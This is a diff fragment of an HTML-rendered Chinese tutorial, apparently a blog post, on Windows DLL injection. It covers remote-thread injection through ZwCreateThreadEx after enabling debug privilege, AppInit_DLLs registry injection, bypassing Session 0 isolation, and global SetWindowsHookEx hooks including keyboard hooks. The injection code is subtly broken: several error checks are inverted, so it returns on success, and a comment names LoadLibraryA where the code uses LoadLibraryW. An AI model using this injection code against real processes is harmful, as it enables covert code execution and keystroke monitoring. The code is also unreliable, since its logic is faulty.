+    <span class="hljs-comment">// &#x5229;&#x7528; TOKEN_ADJUST_PRIVILEGES &#xFF0C;&#x8FD9;&#x65F6;&#x542F;&#x7528;&#x6216;&#x7981;&#x7528;&#x7279;&#x6743;&#x6240;&#x5FC5;&#x9700;&#x7684;&#xFF0C;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x65F6;&#x6807;&#x8BC6;&#x65B0;&#x6253;&#x5F00;&#x7684;&#x8BBF;&#x95EE;&#x4EE4;&#x724C;&#x7684;&#x53E5;&#x67C4;&#x7684;&#x6307;&#x9488;hToken</span>
+    <span class="hljs-keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))
+    {
+        <span class="hljs-comment">// &#x5305;&#x542B;&#x6709;&#x5173;&#x8BBF;&#x95EE;&#x4EE4;&#x724C;&#x7684;&#x4E00;&#x7EC4;&#x7279;&#x6743;&#x7684;&#x4FE1;&#x606F;&#x7684;&#x7ED3;&#x6784;&#x4F53;</span>
+        TOKEN_PRIVILEGES tp;
+
+        <span class="hljs-comment">//  Privileges &#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x6761;&#x76EE;&#x6570;</span>
+        tp.PrivilegeCount = <span class="hljs-number">1</span>;
+
+        <span class="hljs-comment">// &#x5728;&#x672C;&#x5730;&#x7CFB;&#x7EDF;&#x4E0A;&#x67E5;&#x627E;&#x7279;&#x6743;&#x540D;&#x79F0;</span>
+        LookupPrivilegeValue(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="hljs-number">0</span>].Luid);
+
+        <span class="hljs-comment">//</span>
+        tp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;
+
+        <span class="hljs-comment">// &#x542F;&#x7528;&#x6216;&#x7981;&#x7528;&#x6307;&#x5B9A;&#x8BBF;&#x95EE;&#x4EE4;&#x724C;&#x4E2D;&#x7684;&#x7279;&#x6743;</span>
+        AdjustTokenPrivileges(hToken, FALSE, &amp;tp, <span class="hljs-keyword">sizeof</span>(tp), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);
+
+        fOk = (GetLastError() == ERROR_SUCCESS);
+        CloseHandle(hToken);
+    }
+    <span class="hljs-keyword">return</span> fOk;
+}
+
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
+</span>{
+    HANDLE hProcess = <span class="hljs-literal">NULL</span>;
+    SIZE_T dwSize = <span class="hljs-number">0</span>;
+    LPVOID pDllAddr = <span class="hljs-literal">NULL</span>;
+    FARPROC pFuncProcAddr = <span class="hljs-literal">NULL</span>;
+    HANDLE hRemoteThread = <span class="hljs-literal">NULL</span>;
+    DWORD dwStatus = <span class="hljs-number">0</span>;
+
+    <span class="hljs-comment">// &#x5148;&#x7ED9;&#x81EA;&#x5DF1;&#x63D0;&#x6743;</span>
+    EnableDebugPrivilege();
+
+    <span class="hljs-comment">// &#x6253;&#x5F00;&#x6CE8;&#x5165;&#x8FDB;&#x7A0B;&#xFF0C;&#x83B7;&#x53D6;&#x8FDB;&#x7A0B;&#x53E5;&#x67C4;</span>
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, notePID);
+    <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>)
+    {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OpenProcess - Error!\n\n&quot;</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;
+    }
+
+    <span class="hljs-comment">// &#x5728;&#x6CE8;&#x5165;&#x7684;&#x8FDB;&#x7A0B;&#x7533;&#x8BF7;&#x5185;&#x5B58;&#x5730;&#x5740;</span>
+    dwSize = lstrlen(pszDllFileName) + <span class="hljs-number">1</span>;
+    pDllAddr = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);
+    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pDllAddr)
+    {
+        <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;
+    }
+
+    <span class="hljs-comment">//&#x5199;&#x5165;&#x5185;&#x5B58;&#x5730;&#x5740;</span>
+    <span class="hljs-keyword">if</span> (WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize, <span class="hljs-literal">NULL</span>))
+    {
+        <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;
+    }
+
+    <span class="hljs-comment">//&#x52A0;&#x8F7D;ntdll</span>
+    HMODULE hNtdllDll = LoadLibraryA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);
+    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hNtdllDll)
+    {
+        <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;
+    }
+
+    <span class="hljs-comment">// &#x83B7;&#x53D6;LoadLibraryA&#x51FD;&#x6570;&#x5730;&#x5740;</span>
+    pFuncProcAddr = GetProcAddress(GetModuleHandleA(<span class="hljs-string">&quot;Kernelbase.dll&quot;</span>), <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);
+    <span class="hljs-keyword">if</span> (pFuncProcAddr)
+    {
+        <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;
+    }
+
+    <span class="hljs-comment">//&#x83B7;&#x53D6;ZwCreateThreadEx&#x51FD;&#x6570;&#x5730;&#x5740;</span>
+    typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdllDll, <span class="hljs-string">&quot;ZwCreateThreadEx&quot;</span>);
+    <span class="hljs-keyword">if</span> (ZwCreateThreadEx)
+    {
+        <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;
+    }
+
+    <span class="hljs-comment">// &#x4F7F;&#x7528; ZwCreateThreadEx &#x521B;&#x5EFA;&#x8FDC;&#x7EBF;&#x7A0B;, &#x5B9E;&#x73B0; DLL &#x6CE8;&#x5165;</span>
+    dwStatus = ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="hljs-literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+    <span class="hljs-keyword">if</span> (ZwCreateThreadEx)
+    {
+        <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;
+    }
+
+    <span class="hljs-comment">// &#x5173;&#x95ED;&#x53E5;&#x67C4;</span>
+    CloseHandle(hProcess);
+    FreeLibrary(hNtdllDll);
+
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Inject Dll OK!\n\n&quot;</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<h2 id="2&#x3001;&#x4FEE;&#x6539;&#x6CE8;&#x518C;&#x8868;">2&#x3001;&#x4FEE;&#x6539;&#x6CE8;&#x518C;&#x8868;</h2>
+<p>&#x5229;&#x7528; <strong>AppInit_DLLs</strong> &#x6280;&#x672F;&#x901A;&#x8FC7;&#x4FEE;&#x6539;&#x52A0;&#x8F7D;&#x987A;&#x5E8F;&#x6765;&#x8FBE;&#x5230;&#x6CE8;&#x5165;&#x7684;&#x76EE;&#x7684;&#xFF0C;&#x8FD9;&#x4E2A;&#x4FEE;&#x6539;&#x662F;&#x5168;&#x5C40;&#x7684;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x5BFC;&#x81F4;&#x7CFB;&#x7EDF;&#x65E0;&#x6CD5;&#x6B63;&#x5E38;&#x542F;&#x52A8;&#xFF0C;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x6076;&#x610F;&#x75C5;&#x6BD2;&#x4F20;&#x64AD;&#x3002;</p>
+<h3 id="&#x539F;&#x7406;">&#x539F;&#x7406;</h3>
+<p>User32.dll&#x88AB;&#x52A0;&#x8F7D;&#x5230;&#x8FDB;&#x7A0B;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x8BFB;&#x53D6;&#x5B58;&#x653E;&#x5728;AppInit_DLLs&#xFF0C;&#x5982;&#x679C;&#x91CC;&#x9762;&#x6709;&#x503C;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x8C03;&#x7528;loadlibrary&#x52A0;&#x8F7D;&#x7528;&#x6237;dll&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5B58;&#x653E;&#x7684;dll&#x5E76;&#x4E0D;&#x4F1A;&#x52A0;&#x8F7D;&#x5230;&#x6240;&#x6709;&#x8FDB;&#x7A0B;&#xFF0C;&#x53EA;&#x4F1A;&#x52A0;&#x8F7D;&#x5230;User32.dll&#x7684;&#x8FDB;&#x7A0B;&#x4E2D;&#x53BB;&#x3002;</p>
+<h3 id="&#x7A81;&#x7834;">&#x7A81;&#x7834;</h3>
+<p>&#x76F4;&#x63A5;&#x8C03;&#x7528;ZwCreateThreadEx&#xFF0C;&#x5E76;&#x5728;&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x6307;&#x5B9A;CreateSuspended&#x4E3A;0&#x5373;&#x53EF;&#x5B9E;&#x73B0;&#x8FDC;&#x7A0B;&#x7EBF;&#x7A0B;&#x6CE8;&#x5165;DLL&#x7A81;&#x7834;SESSION 0&#x9694;&#x79BB;&#x3002;</p>
+<h2 id="3&#x3001;setwindowshookex">3&#x3001;SetWindowsHookEx</h2>
+<h3 id="&#x539F;&#x7406;">&#x539F;&#x7406;</h3>
+<p>&#x8BE5;&#x65B9;&#x6CD5;&#x7684;&#x6838;&#x5FC3;&#x539F;&#x7406;&#x662F;&#x4F9D;&#x8D56;&#x4E8E;&#x8FD9;&#x4E2A;api&#x8FDB;&#x884C;&#x7684;&#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x6280;&#x672F;&#x3002;</p>
+<p>&#x5E38;&#x89C1;Windows&#x7CFB;&#x7EDF;&#x662F;&#x57FA;&#x4E8E;&#x6D88;&#x606F;&#x673A;&#x5236;&#x7684;&#xFF0C;&#x901A;&#x8FC7;&#x6BCF;&#x4E00;&#x4E2A;GUI&#x7EBF;&#x7A0B;&#x90FD;&#x4F1A;&#x7EF4;&#x62A4;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x6D88;&#x606F;&#x961F;&#x5217;&#x3002;&#x901A;&#x8FC7;&#x8BC6;&#x522B;&#x6D88;&#x606F;&#x961F;&#x5217;&#x4E2D;&#x7684;&#x4E0D;&#x540C;&#x7684;&#x6D88;&#x606F;&#x6765;&#x8FBE;&#x5230;&#x5B9E;&#x73B0;&#x4E0D;&#x540C;&#x529F;&#x80FD;&#x7684;&#x76EE;&#x7684;&#x3002;</p>
+<p>&#x6839;&#x636E;&#x4E0A;&#x8FF0;&#x539F;&#x7406;&#xFF0C;windows&#x901A;&#x8FC7;&#x94A9;&#x5B50;&#x673A;&#x5236;&#x6765;&#x622A;&#x83B7;&#x548C;&#x76D1;&#x89C6;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x8FD9;&#x4E9B;&#x6D88;&#x606F;&#xFF0C;&#x540C;&#x6837;&#x7684;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x5229;&#x7528;hook&#x53BB;&#x5B9E;&#x73B0;&#x81EA;&#x5DF1;&#x7684;&#x76EE;&#x7684;&#x3002;</p>
+<p>Hook&#x5206;&#x4E3A;&#x5168;&#x5C40;&#x548C;&#x5C40;&#x90E8;&#xFF0C;&#x5168;&#x5C40;&#x4E00;&#x822C;&#x7528;&#x6765;&#x5B9E;&#x73B0;dll&#x6CE8;&#x5165;(&#x56E0;&#x4E3A;&#x6BCF;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x7684;&#x5730;&#x5740;&#x90FD;&#x662F;&#x72EC;&#x7ACB;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x5C06;hook&#x51FD;&#x6570;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x72EC;&#x7ACB;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x90A3;&#x4E48;&#x6267;&#x884C;&#x8D77;&#x6765;&#x5C06;&#x975E;&#x5E38;&#x9EBB;&#x70E6;)&#xFF0C;&#x5C40;&#x90E8;hook&#x5C31;&#x662F;&#x9488;&#x5BF9;&#x67D0;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x8FDB;&#x884C;hook&#x3002;</p>
+<pre><code class="lang-c"><span class="hljs-function">HHOOK WINAPI <span class="hljs-title">SetWindowsHookEx</span><span class="hljs-params">(
+__in <span class="hljs-keyword">int</span> idHook, \\&#x94A9;&#x5B50;&#x7C7B;&#x578B;
+__in HOOKPROC lpfn, \\&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x5730;&#x5740;
+__in HINSTANCE hMod, \\&#x5B9E;&#x4F8B;&#x53E5;&#x67C4;
+__in DWORD dwThreadId)</span></span>; \\&#x7EBF;&#x7A0B;ID&#xFF0C;&#x8BBE;&#x7F6E;&#x4E3A;<span class="hljs-number">0</span>&#x5219;&#x4E3A;&#x5168;&#x5C40;&#x94A9;&#x5B50;&#xFF0C;&#x4F1A;&#x5F71;&#x54CD;&#x6240;&#x6709;&#x7684;&#x8FDB;&#x7A0B;
+</code></pre>
+<p>&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;api&#x4E4B;&#x540E;&#xFF0C;&#x5F53;&#x4EFB;&#x610F;&#x8FDB;&#x7A0B;&#x4E2D;&#x751F;&#x6210;&#x6307;&#x5B9A;&#x7684;&#x6D88;&#x606F;&#x7684;&#x65F6;&#x5019;&#xFF0C;os&#x5C31;&#x4F1A;&#x628A;&#x8FD9;&#x4E2A;dll&#x8F7D;&#x8FDB;&#x53BB;&#xFF0C;&#x7136;&#x540E;&#x8C03;&#x7528;hook&#xFF0C;&#x8FD9;&#x90FD;&#x662F;os&#x81EA;&#x52A8;&#x8FDB;&#x884C;&#x7684;&#x3002;</p>
+<ul>
+<li>&#x94A9;&#x5B50;&#x7C7B;&#x578B;&#xFF1A;idHooK</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">&#x503C;</th>
+<th style="text-align:left">&#x542B;&#x4E49;</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>WH_CALLWNDPROC</strong> 4</td>
+<td style="text-align:left">&#x5B89;&#x88C5;&#x4E00;&#x4E2A;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#xFF0C;&#x7528;&#x4E8E;&#x76D1;&#x89C6;&#x7CFB;&#x7EDF;&#x5C06;&#x6D88;&#x606F;&#x53D1;&#x9001;&#x5230;&#x76EE;&#x6807;&#x7A97;&#x53E3;&#x8FC7;&#x7A0B;&#x4E4B;&#x524D;&#x7684;&#x6D88;&#x606F;&#x3002; &#x6709;&#x5173;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; <a href="https://learn.microsoft.com/zh-cn/previous-versions/windows/desktop/legacy/ms644975(v=vs.85" target="_blank">CallWndProc</a>) &#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002;</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>WH_CALLWNDPROCRET</strong> 12</td>
+<td style="text-align:left">&#x5B89;&#x88C5;&#x4E00;&#x4E2A;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#xFF0C;&#x7528;&#x4E8E;&#x5728;&#x76EE;&#x6807;&#x7A97;&#x53E3;&#x8FC7;&#x7A0B;&#x5904;&#x7406;&#x6D88;&#x606F;&#x540E;&#x76D1;&#x89C6;&#x6D88;&#x606F;&#x3002; &#x6709;&#x5173;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winuser/nc-winuser-hookproc" target="_blank">CallWndRetProc</a> &#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002;</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>WH_CBT</strong> 5</td>
+<td style="text-align:left">&#x5B89;&#x88C5;&#x4E00;&#x4E2A;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#xFF0C;&#x7528;&#x4E8E;&#x63A5;&#x6536;&#x5BF9; CBT &#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x6709;&#x7528;&#x7684;&#x901A;&#x77E5;&#x3002; &#x6709;&#x5173;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; <a href="https://learn.microsoft.com/zh-cn/previous-versions/windows/desktop/legacy/ms644977(v=vs.85" target="_blank">CBTProc</a>) &#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002;</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>WH_DEBUG</strong> 9</td>
+<td style="text-align:left">&#x5B89;&#x88C5;&#x4E00;&#x4E2A;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#xFF0C;&#x7528;&#x4E8E;&#x8C03;&#x8BD5;&#x5176;&#x4ED6;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002; &#x6709;&#x5173;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; <a href="https://learn.microsoft.com/zh-cn/previous-versions/windows/desktop/legacy/ms644978(v=vs.85" target="_blank">DebugProc</a>) &#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002;</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>WH_FOREGROUNDIDLE</strong> 11</td>
+<td style="text-align:left">&#x5B89;&#x88C5;&#x5C06;&#x5728;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x524D;&#x53F0;&#x7EBF;&#x7A0B;&#x5373;&#x5C06;&#x5904;&#x4E8E;&#x7A7A;&#x95F2;&#x72B6;&#x6001;&#x65F6;&#x8C03;&#x7528;&#x7684;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002; &#x6B64;&#x6302;&#x94A9;&#x53EF;&#x7528;&#x4E8E;&#x5728;&#x7A7A;&#x95F2;&#x65F6;&#x95F4;&#x6267;&#x884C;&#x4F4E;&#x4F18;&#x5148;&#x7EA7;&#x4EFB;&#x52A1;&#x3002; &#x6709;&#x5173;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; <a href="https://learn.microsoft.com/zh-cn/previous-versions/windows/desktop/legacy/ms644980(v=vs.85" target="_blank">ForegroundIdleProc</a>) &#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002;</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>WH_GETMESSAGE</strong> 3</td>
+<td style="text-align:left">&#x5B89;&#x88C5;&#x4E00;&#x4E2A;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#xFF0C;&#x7528;&#x4E8E;&#x76D1;&#x89C6;&#x53D1;&#x5E03;&#x5230;&#x6D88;&#x606F;&#x961F;&#x5217;&#x7684;&#x6D88;&#x606F;&#x3002; &#x6709;&#x5173;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; <a href="https://learn.microsoft.com/zh-cn/previous-versions/windows/desktop/legacy/ms644981(v=vs.85" target="_blank">GetMsgProc</a>) &#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002;</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>WH_JOURNALPLAYBACK</strong> 1</td>
+<td style="text-align:left">&#x8B66;&#x544A;&#x4ECE;Windows 11&#x5F00;&#x59CB;&#xFF0C;&#x4E0D;&#x652F;&#x6301;&#x65E5;&#x8BB0;&#x6302;&#x94A9; API&#xFF0C;&#x5C06;&#x5728;&#x5C06;&#x6765;&#x7684;&#x7248;&#x672C;&#x4E2D;&#x5220;&#x9664;&#x3002; &#x56E0;&#x6B64;&#xFF0C;&#x6211;&#x4EEC;&#x5F3A;&#x70C8;&#x5EFA;&#x8BAE;&#x6539;&#x4E3A;&#x8C03;&#x7528; <a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-sendinput" target="_blank"><strong>SendInput</strong></a> TextInput API&#x3002;&#x5B89;&#x88C5;&#x4E00;&#x4E2A;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#xFF0C;&#x7528;&#x4E8E;&#x53D1;&#x5E03;&#x4EE5;&#x524D;&#x7531; <a href="https://learn.microsoft.com/zh-cn/windows/desktop/winmsg/about-hooks" target="_blank">WH_JOURNALRECORD</a> &#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x8BB0;&#x5F55;&#x7684;&#x6D88;&#x606F;&#x3002; &#x6709;&#x5173;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; <a href="https://learn.microsoft.com/zh-cn/previous-versions/windows/desktop/legacy/ms644982(v=vs.85" target="_blank">JournalPlaybackProc</a>) &#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002;</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>WH_JOURNALRECORD</strong> 0</td>
+<td style="text-align:left">&#x8B66;&#x544A;&#x4ECE;Windows 11&#x5F00;&#x59CB;&#xFF0C;&#x4E0D;&#x652F;&#x6301;&#x65E5;&#x8BB0;&#x6302;&#x94A9; API&#xFF0C;&#x5C06;&#x5728;&#x5C06;&#x6765;&#x7684;&#x7248;&#x672C;&#x4E2D;&#x5220;&#x9664;&#x3002; &#x56E0;&#x6B64;&#xFF0C;&#x6211;&#x4EEC;&#x5F3A;&#x70C8;&#x5EFA;&#x8BAE;&#x6539;&#x4E3A;&#x8C03;&#x7528; <a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-sendinput" target="_blank"><strong>SendInput</strong></a> TextInput API&#x3002;&#x5B89;&#x88C5;&#x4E00;&#x4E2A;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#xFF0C;&#x7528;&#x4E8E;&#x8BB0;&#x5F55;&#x53D1;&#x5E03;&#x5230;&#x7CFB;&#x7EDF;&#x6D88;&#x606F;&#x961F;&#x5217;&#x7684;&#x8F93;&#x5165;&#x6D88;&#x606F;&#x3002; &#x6B64;&#x6302;&#x94A9;&#x53EF;&#x7528;&#x4E8E;&#x5F55;&#x5236;&#x5B8F;&#x3002; &#x6709;&#x5173;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; <a href="https://learn.microsoft.com/zh-cn/previous-versions/windows/desktop/legacy/ms644983(v=vs.85" target="_blank">JournalRecordProc</a>) &#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002;</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>WH_KEYBOARD</strong> 2</td>
+<td style="text-align:left">&#x5B89;&#x88C5;&#x76D1;&#x89C6;&#x51FB;&#x952E;&#x6D88;&#x606F;&#x7684;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002; &#x6709;&#x5173;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; <a href="https://learn.microsoft.com/zh-cn/previous-versions/windows/desktop/legacy/ms644984(v=vs.85" target="_blank">KeyboardProc</a>) &#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002;</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>WH_KEYBOARD_LL</strong> 13</td>
+<td style="text-align:left">&#x5B89;&#x88C5;&#x7528;&#x4E8E;&#x76D1;&#x89C6;&#x4F4E;&#x7EA7;&#x522B;&#x952E;&#x76D8;&#x8F93;&#x5165;&#x4E8B;&#x4EF6;&#x7684;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002; &#x6709;&#x5173;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; <a href="https://learn.microsoft.com/zh-cn/previous-versions/windows/desktop/legacy/ms644985(v=vs.85" target="_blank">LowLevelKeyboardProc</a>) &#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002;</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>WH_MOUSE</strong> 7</td>
+<td style="text-align:left">&#x5B89;&#x88C5;&#x76D1;&#x89C6;&#x9F20;&#x6807;&#x6D88;&#x606F;&#x7684;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002; &#x6709;&#x5173;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; <a href="https://learn.microsoft.com/zh-cn/previous-versions/windows/desktop/legacy/ms644988(v=vs.85" target="_blank">MouseProc</a>) &#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002;</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>WH_MOUSE_LL</strong> 14</td>
+<td style="text-align:left">&#x5B89;&#x88C5;&#x7528;&#x4E8E;&#x76D1;&#x89C6;&#x4F4E;&#x7EA7;&#x522B;&#x9F20;&#x6807;&#x8F93;&#x5165;&#x4E8B;&#x4EF6;&#x7684;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002; &#x6709;&#x5173;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; <a href="https://learn.microsoft.com/zh-cn/previous-versions/windows/desktop/legacy/ms644986(v=vs.85" target="_blank">LowLevelMouseProc</a>) &#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002;</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>WH_MSGFILTER</strong> -1</td>
+<td style="text-align:left">&#x5B89;&#x88C5;&#x4E00;&#x4E2A;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#xFF0C;&#x7528;&#x4E8E;&#x76D1;&#x89C6;&#x5728;&#x5BF9;&#x8BDD;&#x6846;&#x3001;&#x6D88;&#x606F;&#x6846;&#x3001;&#x83DC;&#x5355;&#x6216;&#x6EDA;&#x52A8;&#x6761;&#x4E2D;&#x7531;&#x8F93;&#x5165;&#x4E8B;&#x4EF6;&#x751F;&#x6210;&#x7684;&#x6D88;&#x606F;&#x3002; &#x6709;&#x5173;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; <a href="https://learn.microsoft.com/zh-cn/previous-versions/windows/desktop/legacy/ms644987(v=vs.85" target="_blank">MessageProc</a>) &#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002;</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>WH_SHELL</strong> 10</td>
+<td style="text-align:left">&#x5B89;&#x88C5;&#x4E00;&#x4E2A;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#xFF0C;&#x7528;&#x4E8E;&#x63A5;&#x6536;&#x5BF9; shell &#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x6709;&#x7528;&#x7684;&#x901A;&#x77E5;&#x3002; &#x6709;&#x5173;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; <a href="https://learn.microsoft.com/zh-cn/previous-versions/windows/desktop/legacy/ms644991(v=vs.85" target="_blank">ShellProc</a>) &#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002;</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>WH_SYSMSGFILTER</strong> 6</td>
+<td style="text-align:left">&#x5B89;&#x88C5;&#x4E00;&#x4E2A;&#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#xFF0C;&#x7528;&#x4E8E;&#x76D1;&#x89C6;&#x5728;&#x5BF9;&#x8BDD;&#x6846;&#x3001;&#x6D88;&#x606F;&#x6846;&#x3001;&#x83DC;&#x5355;&#x6216;&#x6EDA;&#x52A8;&#x6761;&#x4E2D;&#x7531;&#x8F93;&#x5165;&#x4E8B;&#x4EF6;&#x751F;&#x6210;&#x7684;&#x6D88;&#x606F;&#x3002; &#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x76D1;&#x89C6;&#x4E0E;&#x8C03;&#x7528;&#x7EBF;&#x7A0B;&#x4F4D;&#x4E8E;&#x540C;&#x4E00;&#x684C;&#x9762;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x6D88;&#x606F;&#x3002; &#x6709;&#x5173;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; <a href="https://learn.microsoft.com/zh-cn/previous-versions/windows/desktop/legacy/ms644992(v=vs.85" target="_blank">SysMsgProc</a>) &#x6302;&#x94A9;&#x8FC7;&#x7A0B;&#x3002;</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>HOOKPORC</li>
+</ul>
